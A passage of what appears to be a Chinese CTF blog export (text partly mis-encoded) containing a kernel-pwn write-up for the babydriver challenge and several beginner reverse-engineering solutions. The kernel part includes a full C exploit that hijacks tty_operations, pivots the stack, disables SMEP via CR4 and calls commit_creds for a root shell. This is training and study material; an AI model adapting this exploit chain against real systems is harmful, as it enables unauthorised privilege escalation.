æ®µï¼Œåœ¨ç”¨æˆ·æ€ä¼ªé€ tty_operationsç»“æ„ä½“\n\n```c\n    size_t tty_operations_fake[30];\n    for(int j=0;j<30;j++){\n        tty_operations_fake[j]=0xffffffffc0000130+j;   \n    }\n```\n\nåˆ†åˆ«æµ‹è¯•å¯¹`tty_operations->write()`å’Œ`tty_operations->ioclt()`åŠ«æŒæˆåŠŸæ—¶çš„ä¸Šä¸‹æ–‡æƒ…å†µã€‚\n\n1. åŠ«æŒtty_operationsä¸­çš„writeå‡½æ•°ï¼Œ0x7ffe270c1920æ˜¯ç”¨æˆ·æ€ä¼ªé€ çš„tty_operationsç»“æ„ä½“åœ°å€\n\n![image-20220806174447004](image-20220806174447004.png?size=600)\n\n2. åŠ«æŒtty_operationsä¸­çš„ioctlå‡½æ•°ï¼Œ0x7ffe38927460æ˜¯ç”¨æˆ·æ€ä¼ªé€ çš„tty_operationsç»“æ„ä½“åœ°å€\n\n![image-20220806174723108](image-20220806174723108.png?size=600)\n\n\n\n### å¯»æ‰¾gadget\n\nå¯¹äºå†…æ ¸æ–‡ä»¶ï¼Œä½¿ç”¨[ropper](https://github.com/sashs/Ropper)æ‰¾å¯ç”¨gadgetæ¯”ROPgadgetçš„é€Ÿåº¦è¦å¿«ã€‚\n\n- å®‰è£…\n\n```\nsudo pip install capstone\nsudo pip install filebytes\nsudo pip install keystone-engine\npip install ropper\n```\n\n- ä½¿ç”¨\n\n```\nropper --file vmlinux --search \"mov rsp, rax\"\nropper --file vmlinux --search \"mov rsp, rcx\"\n```\n\nä¸ºå®ç°root shellçš„ç›®çš„ï¼Œåªæ‰§è¡Œä¸€æ¡gadgetæ— æ³•è¾¾æˆç›®çš„ï¼Œä¸ºæ­¤æˆ‘ä»¬éœ€è¦æ„é€ ROPé“¾ã€‚ä½†æ˜¯å†…æ ¸æ ˆç©ºé—´æˆ‘ä»¬æ— æ³•æ§åˆ¶ï¼Œå› æ­¤è€ƒè™‘é€šè¿‡ä¸€æ¡gadgetå…ˆè¿ç§»æ ˆåˆ°å¯æ§çš„ç©ºé—´ï¼Œç„¶åç»§ç»­ROPã€‚\n\nå¯¹äºéelfæ ¼å¼çš„äºŒè¿›åˆ¶\n\n```bash\nROPgadget --binary ./Image --rawArch=arm64 --rawMode=64 --rawEndian=little  > gadget.txt\nROPgadget --binary ./Image --rawArch=arm64 --rawMode=64 --rawEndian=little | grep \"0xffffffffffffc000\" | grep \"ret\"  > target.txt\n\nropper --file ./Image -a ARM64 --search \"mov %,sp;\"\n```\n\n#### æ ˆè¿ç§»ï¼ˆ2æ¬¡ï¼‰\n\n> æ‰¾`mov rsp, rax` æˆ–è€… `xchg rax rsp` ä¹‹ç±»çš„æŒ‡ä»¤ï¼Œè¿ç§»æ ˆç©ºé—´\n\næœ¬é¢˜ä½¿ç”¨ropperå¹¶æœªæ‰¾åˆ°åˆé€‚gadgetï¼Œæœ€åè¿˜æ˜¯ç”¨ROPgadgetæ‰¾åˆ°çš„ï¼Œå¦‚ä¸‹ï¼š\n\n```\n$ ROPgadget --binary ./vmlinux > ropgadget.txt\n$ cat ropgadget.txt | grep \"mov rsp,\"\nÂ·Â·Â·Â·Â·Â·\n0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e\n0xffffffff8181a7ef : mov rsp, rax ; pop rax ; jmp 0xffffffff8181a797\nÂ·Â·Â·Â·Â·Â·\n```\n\nä¸Šä¸€æ­¥åŠ«æŒæ§åˆ¶æµä¸­ï¼ŒåŠ«æŒåˆ°tty_operationsä¸­çš„writeå‡½æ•°æ—¶ï¼ŒRAXä¸­å­˜æ”¾äº†ç”¨æˆ·æ€ä¼ªé€ çš„tty_operationsç»“æ„ä½“åœ°å€ã€‚ç»“åˆ`0xffffffff8181bfc5`è¿™æ¡gadgetï¼Œå¯ä»¥å®ç°å°†æ ˆè¿ç§»åˆ°`tty_operations_fake[0]`å¤„ã€‚\n\nç”±äºraxæŒ‡å‘çš„åœ°å€æ˜¯tty_operations_fake[0]çš„é¦–åœ°å€ï¼Œæ‰§è¡Œå‡ æ¡gadgetå°±ä¼šè·Ÿ`tty_operations->write`ï¼ˆtty_operations_fake[7]ï¼‰é‡åˆã€‚å› æ­¤ç¬¬ä¸€æ¬¡åŠ«æŒæ ˆåï¼Œå†åšä¸€æ¬¡æ ˆè¿ç§»ï¼Œå°†æ ˆè¿ç§»åˆ°ä¸€ä¸ªå±€éƒ¨æ•°ç»„å˜é‡ä¸­ã€‚\n\n```c\n    size_t mov_rsp_rax = 0xffffffff8181bfc5; // mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e\n    size_t pop_rax = 0xffffffff8100ce6e;     // pop rax; ret; \n    \n    size_t tty_operations_fake[30];\n    for(int j=0;j<30;j++){\n        tty_operations_fake[j]=mov_rsp_rax;   \n    }\n\n    tty_operations_fake[0] = pop_rax;\t\t\t\t\t// å°†raxçš„å€¼æ”¹ä¸ºrop_chainçš„åœ°å€\n    tty_operations_fake[1] = (size_t)rop_chain;\n    tty_operations_fake[2] = mov_rsp_rax;\t\t\t//\t ç¬¬äºŒæ¬¡ç«™è¿ç§»åˆ°rop_chain\n```\n\n\n\n#### å…³é—­SMEP\n\n[SMEP - ctfwiki](https://ctf-wiki.org/en/pwn/linux/kernel-mode/exploitation/bypass-smep/#smep)\n\nè¡¥å……wikiä¸­çš„æè¿°ï¼Œå½“\n\n```shel\n$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000\n```\n\næ—¶ï¼Œsmep ä¿æŠ¤å¼€å¯ã€‚è€Œ CR4 å¯„å­˜å™¨æ˜¯å¯ä»¥é€šè¿‡ mov æŒ‡ä»¤ä¿®æ”¹çš„ï¼Œå› æ­¤åªéœ€è¦\n\n```shell\nmov cr4, 0x407f0\n# 0x1407e0 = 000 0 0100 0000 0111 1111 0000\n```\n\nCTFæ¯”èµ›ä¸­ï¼Œå¸¸å°†cr4çš„å€¼è®¾ç½®ä¸º0x6f0ï¼Œæ¥å…³é—­SMEPã€‚\n\næœ¬é¢˜é€šè¿‡ropperæ‰¾åˆ°å¦‚ä¸‹ä¸¤æ¡gadgetï¼Œæ¥ä¿®æ”¹cr4å¯„å­˜å™¨çš„å€¼\n\n```\n0xffffffff810d238d: pop rdi; ret;\n0xffffffff81004d80: mov cr4, rdi; pop rbp; ret; \n```\n\n\n\n#### æ‰§è¡Œææƒå‡½æ•°\n\næœ¬é¢˜æœªå¼€å¯KASLRï¼Œè¯»å–ææƒæ‰€éœ€çš„å†…æ ¸ç¬¦å·åœ°å€å¦‚ä¸‹ï¼š\n\n```shell\n/ $ cat /proc/kallsyms > /tmp/kallsyms.txt\n/ $ cd tmp\n/tmp $ ls\nkallsyms.txt\n/tmp $ cat kallsyms.txt | grep \"prepare_kernel_cred\"\nffffffff810a1810 T prepare_kernel_cred\nffffffff81d91890 R __ksymtab_prepare_kernel_cred\nffffffff81dac968 r __kcrctab_prepare_kernel_cred\nffffffff81db9450 r __kstrtab_prepare_kernel_cred\n/tmp $ cat kallsyms.txt | grep \"commit_creds\"\nffffffff810a1420 T commit_creds\nffffffff81d88f60 R __ksymtab_commit_creds\nffffffff81da84d0 r __kcrctab_commit_creds\nffffffff81db948c r __kstrtab_commit_creds\n\n# å‡½æ•°å®šä¹‰\n# struct cred *prepare_kernel_cred(struct task_struct *);\n# int commit_creds(struct cred *);\n```\n\nä¸Šä¸€æ­¥å·²å…³é—­SMEPï¼Œäºæ˜¯åœ¨ç”¨æˆ·æ€æ„é€ å¦‚ä¸‹ä»£ç ç‰‡æ®µï¼Œå³å¯ææƒ\n\n```c\n#define pkc_addr 0xffffffff810a1810\n#define cc_addr 0xffffffff810a1420\nvoid get_root(){\n  char* (*pkc)(int) = pkc_addr;\n  void (*cc)(char*) = cc_addr;\n  (*cc)((*pkc)(0));\n}\n```\n\n\n\n#### è¿”å›ç”¨æˆ·æ€\n\n[FS/GSå¯„å­˜å™¨çš„ç”¨é€”](https://zhuanlan.zhihu.com/p/435518616)\n\n[KERNEL PWNçŠ¶æ€åˆ‡æ¢åŸç†åŠKPTIç»•è¿‡](https://zhuanlan.zhihu.com/p/137277724)\n\n- swapgs\n\n  ä¸€æ¡ç®€å•çš„æŒ‡ä»¤ï¼Œäº¤æ¢ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„GSå¯„å­˜å™¨ã€‚\n\n- iretq\n\n  ä¼šä»å†…æ ¸æ ˆä¸­æ¢å¤`rip/cs/rflags/rsp/ss `è¿™å‡ ä¸ªå¯„å­˜å™¨ï¼Œæ‰§è¡ŒiretqæŒ‡ä»¤æ—¶ï¼Œå†…æ ¸æ ˆåº”æŒ‰å¦‚ä¸‹æ ¼å¼å¸ƒå±€\n\n  ```\n  rsp ---> rip \n           cs\n           rflags\n           rsp\n           ss\n  ```\n\næ‰¾åˆ°å¦‚ä¸‹gadget\n\n```\n0xffffffff81063694: swapgs; pop rbp; ret; \n0xffffffff814e35ef: iretq; ret;\n```\n\n\n\n#### ä¿å­˜ç°åœº\n\nä¸ºäº†èƒ½ç¨³å®šè¿”å›ç”¨æˆ·æ€ï¼Œåœ¨è¿›å…¥å†…æ ¸æ€å‰ï¼Œåº”ä¿å­˜å‡ ä¸ªé‡è¦å¯„å­˜å™¨ï¼Œä¾›iretqæ—¶ä½¿ç”¨ã€‚å‚è€ƒä»£ç å¦‚ä¸‹\n\n```c\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status()\n{\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n// pushf æ ‡å¿—å¯„å­˜å™¨å…¥æ ˆ\n// popf æ ‡å¿—å¯„å­˜å™¨å‡ºæ ˆ\n```\n\n\n\n### å®Œæ•´EXP\n\næ³¨æ„ï¼Œexpéœ€é™æ€ç¼–è¯‘ï¼Œä¸”éœ€æ›´æ”¹`boot.sh`ï¼Œå°†`-enable-kvm`å‚æ•°åˆ é™¤ï¼Œæ‰èƒ½åˆ©ç”¨è¯¥expæ‰“æˆåŠŸã€‚\n\n```c\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\nsize_t pkc_addr = 0xffffffff810a1810;\nsize_t cc_addr = 0xffffffff810a1420;\nvoid get_root(){\n    char* (*pkc)(int) = pkc_addr;\n    void (*cc)(char*) = cc_addr;\n    (*cc)((*pkc)(0));\n}\n\nvoid get_shell(){\n    system(\"/bin/sh\");\n}\n\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status()\n{\n    __asm__(\"mov %cs, user_cs;\"\n            \"mov %ss, user_ss;\"\n            \"mov %rsp, user_sp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n\nint main(){\n    save_status();\n\n    size_t mov_rsp_rax = 0xffffffff8181bfc5;    // mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e\n    size_t pop_rax = 0xffffffff8100ce6e;        // pop rax; ret; \n    \n    size_t rop_chain[30] = {0};\n    int index = 0;\n    rop_chain[index++] = 0xffffffff810d238d;        // pop rdi; ret;\n    rop_chain[index++] = 0x6f0;\n    rop_chain[index++] = 0xffffffff81004d80;        // mov cr4, rdi; pop rbp; ret; \n    rop_chain[index++] = 0x0;\n    rop_chain[index++] = (size_t)get_root;\n    rop_chain[index++] = 0xffffffff81063694;        // swapgs; pop rbp; ret; \n    rop_chain[index++] = 0x0;\n    rop_chain[index++] = 0xffffffff814e35ef;        // iretq; ret;\n    rop_chain[index++] = (size_t)get_shell;\n    rop_chain[index++] = user_cs;\n    rop_chain[index++] = user_rflags;\n    rop_chain[index++] = user_sp;\n    rop_chain[index++] = user_ss;\n\n    size_t tty_operations_fake[30];\n    for(int j=0;j<30;j++){\n        tty_operations_fake[j]=mov_rsp_rax;   \n    }\n\n    int fd1 = open(\"/dev/babydev\",2);\n    int fd2 = open(\"/dev/babydev\",2);\n\n    ioctl(fd1,0x10001,0x2e0);\n    close(fd1);\n\n    int fd_tty = open(\"dev/ptmx\",2);\n\n    size_t tty_struct_leak[4];\n    read(fd2,tty_struct_leak,32);\n    \n    tty_operations_fake[0] = pop_rax;\n    tty_operations_fake[1] = (size_t)rop_chain;\n    tty_operations_fake[2] = mov_rsp_rax;\n\n    tty_struct_leak[3] = (size_t)tty_operations_fake;\n    write(fd2,tty_struct_leak,32);\n\n    size_t a[4] = {0,0,0,0};\n    write(fd_tty,a,32);\n    // ioctl(fd_tty,0x100,32);\n\n    close(fd2);\n\treturn 0;\n}\n```\n\n\n\n# å…¶ä»–\n\n## cpioè§£å‹ä¸å‹ç¼©\n\n```shell\n# è§£å‹\n$ gunzip filename.cpio.gz\n$ cpio -idmv < filename.cpio\n# å‹ç¼©\n$ find . | cpio -o -H newc > filename.cpio\n# æˆ– find . | cpio -o > filename.cpio\n# æˆ– find . | cpio -o --format=newc > ../rootfs.cpio\n```\n\n\n\n## å°†bzImageè½¬åŒ–æˆvmlinux\n\nvmlinuxå³å†…æ ¸ç¬¦å·æ–‡ä»¶ï¼Ÿ\n\n```shell\n$ /usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage > vmlinux\n```\n\nvmlinuxä¸bzimageçš„åŒºåˆ«\n\n```shell\n$ file vmlinux \nvmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=76517ec1ebecb36ffb324a8b5b0495c51625c53b, stripped\n$ file bzImage \nbzImage: Linux kernel x86 boot executable bzImage, version 4.15.8 (root@ubuntu) #3 SMP Thu Jun 3 01:01:56 PDT 2021, RO-rootFS, swap_dev 0x7, Normal VGA\n```\n\n\n\n## koä»£ç æ®µä¸bssæ®µçš„åœ°å€\n\n> è°ƒè¯•å†…æ ¸æ¨¡å—bssæ®µæ—¶ï¼Œè¦æ³¨æ„å®é™…åœ°å€è·ŸIDAåˆ†æå‡ºæ¥çš„åœ°å€ä¸ä¸€æ ·ã€‚\n\nbabydriver.koçš„åŠ è½½åœ°å€æ˜¯`0xffffffffc0000000`ï¼Œtextæ®µå¦‚`babyopen()`å‡½æ•°ï¼ˆIDAä¸­æ˜¾ç¤ºåç§»ä¸º0x30ï¼‰çš„å®é™…åœ°å€ä¸º`0xffffffffc0000030`ï¼Œè€Œbssæ®µ`babydev_struct`ç»“æ„ä½“ï¼ˆIDAä¸­æ˜¾ç¤ºåç§»ä¸º0xd90ï¼‰çš„å®é™…åœ°å€ä¸º`0xffffffffc00024d0`ã€‚\n\n```\npwndbg> x/10gx 0xffffffffc0000d90\n0xffffffffc0000d90:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc0000da0:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc0000db0:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc0000dc0:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc0000dd0:\t0x0000000000000000\t0x0000000000000000\npwndbg> x/10gx 0xffffffffc00024d0\n0xffffffffc00024d0:\t0xffff8800027dcb00\t0x0000000000000040\n0xffffffffc00024e0:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc00024f0:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc0002500:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc0002510:\t0x0000000000000000\t0x0000000000000000\n```\n\n\n\n","tags":["kernel pwn"],"categories":["CTF"]},{"title":"åŸºç¡€é€†å‘ç»ƒä¹ é¢˜","url":"/2022/07/01/basic-reverse-exercise/","content":"\n\n\n# check_in\n\né™„ä»¶ï¼š[check_in.zip](check_in.zip)\n\n> init_array\n\né€šè¿‡IDAï¼Œé€†å‘å¾—åˆ°mainå‡½æ•°ï¼š\n\n```c\n__int64 __fastcall main(int a1, char **a2, char **a3)\n{\n  char s1[268]; // [rsp+10h] [rbp-110h] BYREF\n  int v5; // [rsp+11Ch] [rbp-4h]\n\n  v5 = 0;\n  gets(s1, 256LL, a3);\n  if ( !strncmp(s1, s2, 0x100uLL) )\n    puts(\"flag is right\");\n  else\n    puts(\"flag is wrong\");\n  return 0LL;\n}\n```\n\ns2åœ¨dataæ®µï¼Œä½†æ˜¯è¯¥å­—ç¬¦ä¸²å¹¶éçœŸæ­£çš„flagã€‚\n\n```\n.data:0000000000404040 ; char s2[]\n.data:0000000000404040 s2              db 'flag{check_inn}',0 \n```\n\næ¥ä¸‹æ¥æœ‰ä¸¤ç§æ€è·¯ï¼š\n\n1. init_array ä¸­å­˜åœ¨å‡½æ•°ï¼Œåœ¨mainå‡½æ•°ä¹‹å‰æ‰§è¡Œã€‚ï¼ˆå› æ­¤s2è¢«åˆå§‹åŒ–æˆåˆ«çš„å€¼ï¼‰\n2. æŸ¥æ‰¾å¯¹s2çš„å¼•ç”¨ï¼Œåœ¨ `sub_4011D0()` å‡½æ•°ä¸­å¯¹s2åšäº†æ›´æ”¹ã€‚\n\nä¸¤è€…éƒ½æŒ‡å‘åŒä¸€ä¸ªå‡½æ•°ï¼š\n\n```c\n_BYTE *sub_4011D0()\n{\n  _BYTE *result; // rax\n\n  result = (_BYTE *)((unsigned int)s2 + 15);\n  *(_BYTE *)((int)result - 1LL) = '_';\n  *(_BYTE *)(int)result = 'i';\n  *(_BYTE *)((int)result + 1LL) = 's';\n  *(_BYTE *)((int)result + 2LL) = '_';\n  *(_BYTE *)((int)result + 3LL) = 'n';\n  *(_BYTE *)((int)result + 4LL) = 'o';\n  *(_BYTE *)((int)result + 5LL) = 't';\n  *(_BYTE *)((int)result + 6LL) = '_';\n  *(_BYTE *)((int)result + 7LL) = 'r';\n  *(_BYTE *)((int)result + 8LL) = 'e';\n  *(_BYTE *)((int)result + 9LL) = 'a';\n  *(_BYTE *)((int)result + 0xALL) = 'l';\n  *(_BYTE *)((int)result + 0xBLL) = 'l';\n  *(_BYTE *)((int)result + 0xCLL) = '}';\n  *(_BYTE *)((int)result + 0xDLL) = '\\0';\n  return result;\n}\n```\n\næ‰€ä»¥flagæ˜¯ `flag{check_inn_is_not_reall}`\n\n# dang-van\n\né™„ä»¶ï¼š[dang-van.zip](dang-van.zip)\n\n>ä¸€ä¸ªæ›´æ”¹è¿‡çš„base64\n\nmainå‡½æ•°å¦‚ä¸‹ï¼Œchangeå‡½æ•°ä¸­å‘ç°ä¸€ä¸ªç±»ä¼¼base64çš„ç´¢å¼•è¡¨\n\n```\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char v3; // bl\n  char v5[16]; // [rsp+0h] [rbp-40h] BYREF\n  char v6[16]; // [rsp+10h] [rbp-30h] BYREF\n  char v7[32]; // [rsp+20h] [rbp-20h] BYREF\n\n  std::string::string((std::string *)v5);\n  std::operator<<<std::char_traits<char>>(&std::cout, \"Input your secret: \");\n  std::operator>><char>(&std::cin, v5);\n  std::string::string((std::string *)v6, (const std::string *)v5);\n  change((__int64)v7, (std::string *)v6);\n  v3 = std::operator==<char>(v7, \"ms4otszPhcr7tMmzGMkHyFn=\");\n  std::string::~string((std::string *)v7);\n  std::string::~string((std::string *)v6);\n  if ( v3 )\n    std::operator<<<std::char_traits<char>>(&std::cout, \"Good boy! Submit your flag :)\");\n  else\n    std::operator<<<std::char_traits<char>>(&std::cout, \"Too bad :(\");\n  std::string::~string((std::string *)v5);\n  return 0;\n}\n```\n\nexpå¦‚ä¸‹ï¼š\n\n```python\na = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"\nb = \"ELF8n0BKxOCbj/WU9mwle4cG6hytqD+P3kZ7AzYsag2NufopRSIVQHMXJri51Tdv=\"\nb_str = \"ms4otszPhcr7tMmzGMkHyFn=\"\ndict1 = {}\n\nfor i in range(len(a)):\n    dict1[b[i]] = a[i]\nprint(dict1)\n\nfor j in b_str:\n    print(dict1[j],end=\"\")\n\nprint(\"\\n\")\n```\n\nå¾—åˆ° `RnVubnlfZW5jb2RlX2h1aCE=` ï¼Œå†base64è§£ç ï¼š\n\n```bash\n$ echo RnVubnlfZW5jb2RlX2h1aCE= | base64 -d\nFunny_encode_huh!\n```\n\n\n\n# flag_finder\n\né™„ä»¶ï¼š[flag_finder.zip](flag_finder.zip)\n\n> ä¸‹æ–­ç‚¹è°ƒè¯•\n\nmainå‡½æ•°å¦‚ä¸‹\n\n```c\n__int64 __fastcall main(int a1, char **a2, char **a3)\n{\n  __int64 result; // rax\n  void *v4; // rsp\n  unsigned int v5; // ebx\n  char v6; // r13\n  char **v7; // [rsp+0h] [rbp-50h] BYREF\n  int v8; // [rsp+Ch] [rbp-44h]\n  unsigned int v9; // [rsp+18h] [rbp-38h]\n  int v10; // [rsp+1Ch] [rbp-34h]\n  __int64 v11; // [rsp+20h] [rbp-30h]\n  char *dest; // [rsp+28h] [rbp-28h]\n\n  v8 = a1;\n  v7 = a2;\n  if ( a1 == 2 )\n  {\n    v11 = (unsigned int)n - 1LL;\n    v4 = alloca(16 * (((unsigned __int64)(unsigned int)n + 15) / 0x10));\n    dest = (char *)&v7;\n    strcpy((char *)&v7, a2j);\n    v10 = 0;\n    v9 = 0;\n    while ( memcmp(dest, \"9447\", 4uLL) )\n    {\n      v5 = v9 % (unsigned int)n;\n      v6 = dest[v9 % (unsigned int)n];\n      dest[v5] = sub_40060D() ^ v6;\n      ++v9;\n    }\n    if ( !memcmp(dest, v7[1], (unsigned int)n) )\n      printf(\"The flag is %s\\n\", v7[1]);\n    else\n      puts(\"Try again\");\n    result = 0LL;\n  }\n  else\n  {\n    printf(\"Usage: %s <password>\\n\", *v7);\n    result = 1LL;\n  }\n  return result;\n}\n```\n\nv7[1] æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œå› æ­¤å†`memcmp(dest, v7[1], (unsigned int)n)`å¤„ä¸‹æ–­ç‚¹å³å¯çœ‹åˆ°destä¸­å­˜æ”¾çš„å­—ç¬¦ä¸²ï¼ˆå³flagï¼‰ï¼š\n\n```\npwndbg> set arg aaaa\npwndbg> b *0x400729\npwndbg> r\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n â–º 0x400729    call   memcmp@plt <memcmp@plt>\n        s1: 0x7fffffffdc10 â—‚â€” '9447{C0ngr47ulaT1ons_p4l_buddy_y0Uv3_solved_the_re4l__H4LT1N6_prObL3M}'\n        s2: 0x7fffffffe154 â—‚â€” 0x4548530061616161 /* 'aaaa' */\n        n: 0x46\n```\n\nå¾—åˆ°flagï¼š`9447{C0ngr47ulaT1ons_p4l_buddy_y0Uv3_solved_the_re4l__H4LT1N6_prObL3M}`\n\n\n\n# debug_me\n\né™„ä»¶ï¼š[debug_me.zip](debug_me.zip)\n\n> åè°ƒè¯•\n\nmainå‡½æ•°ä¸­å°†æˆ‘ä»¬çš„è¾“å…¥ä¼ ç»™ `sub_4006FD()` å‡½æ•°å¤„ç†ã€‚æ­¤æ—¶æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼š1ï¼‰ç›´æ¥åœ¨forå¾ªç¯ä¸­ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹æ¯æ¬¡æ‰§è¡Œæ—¶ `*(char *)(v3[i % 3] + 2 * (i / 3))` çš„ç»“æœï¼Œå°†æ¯ä¸ªæ•°å‡1å°±å¾—åˆ°flagã€‚2ï¼‰é‡å†™è¿™ä¸ªå‡½æ•°ï¼Œç¼–è¯‘è·‘ä¸€éã€‚\n\n```c\n__int64 __fastcall sub_4006FD(__int64 a1)\n{\n  int i; // [rsp+14h] [rbp-24h]\n  __int64 v3[4]; // [rsp+18h] [rbp-20h]\n\n  v3[0] = (__int64)\"Dufhbmf\";\n  v3[1] = (__int64)\"pG`imos\";\n  v3[2] = (__int64)\"ewUglpt\";\n  for ( i = 0; i <= 11; ++i )\n  {\n    if ( *(char *)(v3[i % 3] + 2 * (i / 3)) - *(char *)(i + a1) != 1 )\n      return 1LL;\n  }\n  return 0LL;\n}\n```\n\n**æ–¹æ³•1**\n\ngdbè°ƒè¯•æ—¶å‘ç°ç¨‹åºæ— æ³•æ­£å¸¸è¿è¡Œï¼Œctrl-c åå¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºåœ¨0x4007e4å¤„è¿›å…¥äº†å¾ªç¯ã€‚ï¼ˆå¦ä¸€ç§æ–¹æ³•ï¼Œåœ¨`gdb r`å‘½ä»¤å‰ï¼Œä½¿ç”¨ `catch syscall` å¯¹æ¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ä¸‹æ–­ç‚¹ï¼Œä¹Ÿèƒ½è·Ÿè¸ªåˆ°ptraceè°ƒç”¨ç‚¹ï¼‰\n\n```\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n â–º 0x4007e4    jmp    0x4007e4 <0x4007e4>\n    â†“\n   0x4007e4    jmp    0x4007e4 <0x4007e4>\n```\n\nå¯¹åº”åˆ°äºŒè¿›åˆ¶çš„ `sub_4007A8()` å‡½æ•°ï¼Œè¯¥äºŒè¿›åˆ¶å¼€å¯äº†åè°ƒè¯•\n\n```c\n__int64 sub_4007A8()\n{\n  __int64 result; // rax\n\n  if ( (unsigned int)getenv(\"LD_PRELOAD\") )\t\t\t// é˜²æ³¨å…¥\n  {\n    while ( 1 )\n      ;\n  }\n  result = ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL);\t\t// åè°ƒè¯•\n  if ( result < 0 )\n  {\n    while ( 1 )\n      ;\n  }\n  return result;\n}\n```\n\nè¿™ä¸ªé¢˜æ¯”è¾ƒç®€å•ï¼Œè™½ç„¶å¼€äº†åè°ƒè¯•ï¼Œä½†æˆ‘ä»¬å¯ä»¥åœ¨è°ƒç”¨ `sub_4007A8()` å‡½æ•°ä¹‹å‰ä¸‹æ–­ç‚¹ï¼Œgdbä¸­ä¿®æ”¹å†…å­˜æˆ–å¯„å­˜å™¨å€¼ï¼Œç»•è¿‡æ£€æµ‹ï¼Œç„¶åè¿›å…¥ `sub_4006FD()` å‡½æ•°æŸ¥çœ‹å­—ç¬¦ä¸²è®¡ç®—ç»“æœï¼Œå¾—åˆ°flagã€‚\n\n```c\nvoid __fastcall init(unsigned int a1, __int64 a2, __int64 a3)\n{\n  __int64 v4; // rbx\n  signed __int64 v5; // rbp\n\n  v4 = 0LL;\n  v5 = &off_600E18 - funcs_4008D9;\n  init_proc();\n  if ( v5 )\t\t\t\t// åœ¨è¿™ä¹‹å‰å°†v5è®¾ç½®æˆ0\n  {\n    do\n      ((void (__fastcall *)(_QWORD, __int64, __int64))funcs_4008D9[v4++])(a1, a2, a3);\n    while ( v4 != v5 );\n  }\n}\n```\n\n\n\n**æ–¹æ³•2**\n\nexpå¦‚ä¸‹ï¼š\n\n```c\n#include<stdio.h>\n#include<stdint.h>\n\nint main(){\n\n    uint64_t v3[3];\n    v3[0] = (uint64_t)\"Dufhbmf\";\n    v3[1] = (uint64_t)\"pG`imos\";\n    v3[2] = (uint64_t)\"ewUglpt\";\n\n    int i = 0,a =0;\n    for(i = 0; i <= 11; i++){\n        a = *(char *)(v3[i%3] + 2 *(i/3));\n        printf(\"0x%x, \",a-1);\n        printf(\"%c, \",a-1);\n    }\n\n  return 0;\n}\n// Code_Talkers\n```\n\n# float\n\né™„ä»¶ï¼š[float.zip](float.zip)\n\nã€æš‚æœªè§£å‡ºã€‘\nå¯å‚è€ƒWPï¼š[å¼ºç½‘æ¯2021 ctfçº¿ä¸Šèµ›ezmath wp](https://www.dounaite.com/article/627d7e86ac359fc9132eee31.html)\n\n\næœ¬é¢˜çš„ä¸»è¦è®¡ç®—æ­¥éª¤åœ¨sub_13f3å‡½æ•°ä¸­ï¼Œv3çš„åˆå§‹å€¼ä¸º0.2021ï¼Œiçš„èµ·å§‹å€¼ä¸º0x2021ï¼Œä¹ä¸€çœ‹`v3 = 2.718281828459045 - (double)i * v3` çš„è®¡ç®—ç»“æœä¼šå°äº0ã€‚è€Œmainå‡½æ•°ä¸­å¾…æ¯”å¯¹çš„ç»“æœ`dbl_4020æ•°ç»„`ä¸­å€¼éƒ½æ˜¯å¤§äº0çš„æµ®ç‚¹æ•°ã€‚æ‰€ä»¥è¿™é‡Œçš„è®¡ç®—å¾ˆå¥‡æ€ªï¼ŒåŠ 